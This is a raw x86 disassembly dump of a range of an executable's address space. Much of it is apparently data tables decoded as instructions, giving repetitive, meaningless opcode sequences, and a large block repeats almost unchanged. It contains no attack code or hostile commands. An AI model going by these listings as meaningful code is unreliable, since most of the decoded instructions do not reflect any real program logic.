  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dh
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dh
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
